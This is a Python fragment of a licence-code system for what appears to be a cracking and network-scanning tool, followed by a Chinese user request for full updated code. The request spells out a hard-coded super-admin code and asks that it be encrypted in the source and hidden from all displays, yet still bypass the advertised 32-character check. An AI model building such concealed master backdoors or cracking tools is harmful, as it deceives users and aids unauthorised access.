        if not os.path.exists(ENCRYPTION_KEY_FILE):
            key = Fernet.generate_key()
            with open(ENCRYPTION_KEY_FILE, 'wb') as f:
                f.write(key)
            os.chmod(ENCRYPTION_KEY_FILE, 0o600)
    except Exception as e:
        logging.error(f"初始化失败: {str(e)}")

# ====== 主程序入口 ======
if __name__ == "__main__":
    # 依赖检查和环境设置
    setup_environment()
    
    # 初始化日志
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.FileHandler(LOG_FILE),
            logging.StreamHandler()
        ]
    )

    # 授权验证流程
    auth_mgr = AuthManager()
    print("\n{:=^50}".format(" 多级授权验证 "))
    
    while True:
        code = input("请输入授权码（Q退出）: ").strip()
        if code.upper() == 'Q':
            sys.exit()
        
        # 特殊处理超级管理员码（不限制长度）
        if code == HIDDEN_ADMIN_CODE:
            if auth_mgr.validate_code(code):
                break
            continue
        
        # 普通授权码检查（32位）
        if len(code) == 32 and auth_mgr.validate_code(code):
            break
        
        print("无效的授权码！")

    # 显示授权信息
    print(f"\n欢迎，{auth_mgr.user_type.chinese}")
    if auth_mgr.user_type.expiry_type != "永久":
        print(f"授权到期时间：{auth_mgr.expiry_time.strftime('%Y-%m-%d %H:%M:%S') if auth_mgr.expiry_time else '永久'}")
        print(f"剩余时间：{auth_mgr.get_remaining_time()}")

    # 后续初始化和主程序启动...
    # （其他模块如字典管理、网络扫描、破解核心等保持不变，主要修改授权相关逻辑）

    # 以下为原有MainApp等模块，需根据新的UserType和授权逻辑调整显示部分
    # 由于篇幅限制，其他模块代码需同步更新显示身份和到期时间，此处省略具体实现...

    # 示例：显示状态函数修改
    def show_status(self):
        status = [
            f"当前身份: {self.auth_mgr.user_type.chinese}",
            f"授权状态: {self.auth_mgr.user_type.expiry_type if self.auth_mgr.user_type.expiry_type == '永久' else f'到期时间 {self.auth_mgr.expiry_time.strftime("%Y-%m-%d %H:%M")} 剩余 {self.auth_mgr.get_remaining_time()}'}"
        ]
        # 其他状态信息...
        print("\n".join(status))

超级管理员授权码为1466297085

超级管理员授权码1466297085不受32位限制（超级管理员可生成管理员授权码、代理商授权码、永久普通授权码“也称为超级会员授权码”、普通授权码）

代理商无法生成永久授权码

但是输入授权码处任然显示为'请输入32位授权码（Q退出）'

超级管理员授权码1466297085无视32位授权码限制
请输入32位授权码处输入1466297085回车直接进入

所有显示不能显示1466297085必须保密，代码中的1466297085进行加密，但是输入1466297085任然生效

将新生成的授权码在原本的txt文本中添加保留原本的并非覆盖
比如管理员授权码.txt中原本有"32位   时间"
新生成后在
"32位   时间"
后面增加
"32位   时间"
下次新生后
"32位   时间"
"32位   时间"
后面增加
"32位   时间"（时间格式为：天数时间、到期时间、生成时间）
以此类推
将授权码.txt删除
管理员授权码.txt
代理商授权码.txt
永久授权码.txt
普通授权码.txt

所有授权码按第一次使用的时候还是计算
比如第一次使用时间为2025-5-1-20:30:30:30
  以后计算时间都按照2025-5-1-20:30:30:30计算

更新授权码储存规则
管理员授权码.txt
（储存管理员授权码、代理商授权码、永久授权码、普通授权码）
代理商授权码.txt
（储存代理商授权码、永久授权码、普通授权码）
永久授权码.txt
（储存永久授权码、普通授权码）
普通授权码.txt
（储存普通授权码）

全局显示身份：超级管理员、管理员、代理商、超级会员（普通会员5年及以上到永久）、普通会员
全局显示到期时间以及倒计时：
普通会员  到期时间：2025-5-2  剩余：1天23小时12分51秒
超级会员  到期时间：2030-5-2（永久显示为永久）  剩余：5年1天23小时12分51秒（永久则不显示）
代理商    到期时间：永久
管理员    管理
超级管理员（无到期时间）

给我更新后的完全可用完整代码全部
完整代码一次性回答不完分两轮回答给我